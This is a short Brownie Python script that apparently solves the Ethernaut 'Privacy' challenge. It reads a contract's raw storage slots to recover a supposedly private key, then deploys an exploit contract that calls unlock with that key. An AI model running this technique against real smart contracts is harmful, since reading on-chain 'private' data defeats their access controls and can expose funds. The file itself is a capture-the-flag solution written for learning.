from brownie import config,accounts, web3, Privacy, PrivacyExploit

InstanceAddress = "0x6FD8B7d595bc57273A44Cd6f3961169E94934a74"

player = accounts.add(config["wallets"]["from_key"]) 

def main():
    privacy = Privacy.at(InstanceAddress)
    slot_0 = web3.eth.get_storage_at(InstanceAddress, 0) #first slot is bool
    slot_1 = web3.eth.get_storage_at(InstanceAddress, 1) #uint256 is it's own slot
    slot_2 = web3.eth.get_storage_at(InstanceAddress, 2) #uint8 + uint8 + uint16
    slot_3 = web3.eth.get_storage_at(InstanceAddress, 3) #bytes32[0]
    slot_4 = web3.eth.get_storage_at(InstanceAddress, 4) #bytes32[1]
    slot_5 = web3.eth.get_storage_at(InstanceAddress, 5) #bytes32[2]
    print(slot_5)
    
    key = slot_5


    privacyExploit = PrivacyExploit.deploy(InstanceAddress, {"from": player})
    privacyExploit.unlock(key, {"from": player})